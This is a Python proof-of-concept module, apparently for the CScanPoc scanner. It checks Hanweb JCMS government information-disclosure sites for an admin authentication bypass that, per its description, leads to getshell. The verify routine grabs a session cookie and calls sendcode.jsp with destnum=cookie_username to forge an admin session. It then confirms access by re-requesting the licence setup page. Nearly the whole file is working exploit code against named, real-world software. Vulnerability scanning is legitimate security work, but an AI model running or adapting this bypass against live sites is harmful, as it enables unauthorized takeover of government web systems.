# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'JCMS_0010'  # 平台漏洞编号，留空
    name = '大汉政府信息公开网站群存在getshell的风险'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.MISCONFIGURATION  # 漏洞类型
    disclosure_date = '2016-02-15'  # 漏洞公布时间
    desc = '''
        大汉政府信息公开网站群存在getshell的风险,管理后台权限绕过，进入后台后轻松GetShell.
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=0152666'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Hanweb(大汉)'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'de8011e0-7904-423e-9bb5-99089b8bc1f7'
    author = '国光'  # POC编写者
    create_date = '2018-05-13'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            url = arg + "/setup/opr_licenceinfo.jsp"
            code, head, res, errcode, _ = hh.http(url)
            if "top.location='index.html'" in res and re.search('Set-Cookie: ([a-zA-Z0-9=]*);', head):
                url1 = arg + '/jcms_files/jcms1/web1/site/zfxxgk/ysqgk/sendcode.jsp?webid=2&destnum=cookie_username'
                cookie = re.search(
                    'Set-Cookie: ([a-zA-Z0-9=]*);', head).group(1)
                code, head, res, errcode, _ = hh.http(url1, cookie=cookie)
                code, head, res, errcode, _ = hh.http(url, cookie=cookie)
                if "top.location='index.html'" not in res:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
